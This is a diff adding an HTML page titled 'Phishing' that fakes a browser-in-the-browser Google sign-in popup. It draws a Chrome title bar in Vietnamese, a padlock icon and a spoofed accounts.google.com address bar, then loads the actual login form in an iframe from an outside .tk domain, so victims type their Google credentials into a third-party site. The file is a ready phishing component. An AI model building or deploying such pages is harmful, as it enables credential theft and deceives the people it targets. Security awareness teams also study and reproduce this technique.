@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<title>Phishing</title>
+	<link rel="icon" type="image/png" href="../crf.jpg">
+</head>
+
+<body>
+	<img id="clickme" src="../loginms.png" style="display: flex; margin: auto; margin-top: 100px;"></img>
+	<div id="window">
+		<!-- Title bar start -->
+		<div id="title-bar-width">
+			<div id="title-bar" class="outer yosemite">
+				<span class="dots">
+					<div id="exit" class="dot red"></div>
+					<div id="minimize" class="dot amber"></div>
+					<div id="maximize" class="dot green"></div>
+				</span>
+
+				<span id="logo-description">Đăng nhập - Tài khoản Google - Google Chrome</span>
+			</div>
+			<div id="url-bar">
+				<img src="../ssl.svg" width="20px" height="20px" id="ssl-padlock">
+				<span id="domain-name">https://accounts.google.com/</span>
+				<span
+					id="domain-path">/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow</span>
+			</div>
+		</div>
+		<!-- Content start -->
+		<div id="load">
+			<iframe id="content" src="https://www.ltp110.tk/google-login/" frameBorder="0"></iframe>
+		</div>
+	</div>
+</body>
+<script src="script.js"></script>
+
+</html>
